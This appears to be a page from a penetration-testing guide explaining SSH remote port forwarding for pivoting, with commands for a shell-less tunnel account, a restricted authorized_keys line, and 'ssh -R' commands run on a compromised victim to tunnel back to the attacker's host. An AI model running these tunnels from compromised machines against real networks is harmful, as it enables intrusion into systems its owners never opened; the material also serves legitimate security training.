# Remote Forwarding

## Theory

Reverse connections are very possible with the SSH client (and indeed may be preferable if you have a shell on the compromised server, but not SSH access). They are, however, riskier as you inherently must access your attacking machine from the target -- be it by using credentials, or preferably a key based system.

Type of Remote Forwarding -> Reverse Connection

## Practice

For both cases, we need an SSH server on our computer:

```bash
# Enable SSH service on your computer:
service ssh start
systemctl start ssh
```

### Method #1

On our machine, we enable the SSH service and, since we are going to open an SSH connection from a compromised server to our own machine, it is important to create a dedicated account without a shell to prevent hacking by a company administrator or, potentially, a cybercriminal who has also compromised the server:

```bash
# Create a user without shell with a random password:
sudo useradd sshpivot --no-create-home --shell /bin/false
sudo passwd sshpivot # Set any password
```

{% hint style="warning" %}
PS: You must add **/bin/false** in `/etc/shells`, otherwise the connection will be denied.
{% endhint %}

We run this on the victim machine:

```bash
ssh -R 4646:<VICTIM IP/PIVOT IP>:<RPORT> sshpivot@<LHOST> -fNT
ssh -R 4646:<VICTIM IP/PIVOT IP>:<RPORT> sshpivot@<LHOST> -N
# VICTIM IP will be 127.0.0.1, but if we want to see a port/service of another machine that is visible from the compromised victim machine, then we indicate the PIVOT IP.
```

### Method #2

Before we can make a reverse connection safely, there are a few steps we need to take. First, generate a new set of SSH keys and store them somewhere safe (`ssh-keygen`):

```
cd ~
ssh-keygen
mv id_rsa.pub authorized_keys
```

In the authorized\_keys file, add the following line:

```bash
command="echo 'This account can only be used for port forwarding'",no-agent-forwarding,no-x11-forwarding,no-pty
```

![](../../../.gitbook/assets/authozired\_keys\_port\_forward.png)

Finally, **transfer the private key to the target box**. With the key transferred, we can then connect back with a reverse port forward using the following command:

```bash
ssh -R <LPORT>:<TARGET_IP>:<TARGET_PORT> <USER>@<LHOST> -i id_rsa -fN
```
